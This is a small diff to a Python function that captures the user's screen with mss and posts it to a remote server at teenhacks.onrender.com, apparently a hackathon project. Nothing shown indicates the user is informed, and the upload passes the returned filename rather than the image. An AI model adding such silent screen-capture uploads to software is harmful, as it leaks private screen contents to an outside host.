@@ -6,14 +6,14 @@ import requests
 def take_screenshot():
     with mss() as sct:
         img_sct = sct.shot()
-        try:
+        try: 
             response = requests.get('https://teenhacks.onrender.com/')
             if response.status_code != 200:
                 raise Exception('Failed to retrieve website')
         except Exception as e:
             print(f'Failed to retrieve website: {str(e)}')
             return
-    requests.post('https://teenhacks.onrender.com/upload', data=img_sct)
+        requests.post('https://teenhacks.onrender.com/upload', data=img_sct)
 
 
         #sct.shot(output=f"Screenshots/screenshot{time.time()}.png")
